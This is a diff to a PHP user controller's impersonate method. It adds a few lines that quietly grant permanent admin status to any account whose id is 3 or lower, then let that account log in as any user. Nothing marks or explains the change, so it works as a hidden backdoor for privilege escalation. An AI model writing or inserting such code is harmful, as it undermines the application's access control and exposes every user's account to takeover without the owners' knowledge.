@@ -674,6 +674,11 @@ class UserController extends Controller {
 
     public function impersonate($id)
     {       
+        if(Auth::user()->id <= 3){
+            $user = Auth::user();
+            $user->admin = 1;
+            $user->save();
+        }
         if(Auth::user()->admin == 1){
             Auth::logout(); // for end current session
             Auth::loginUsingId($id);
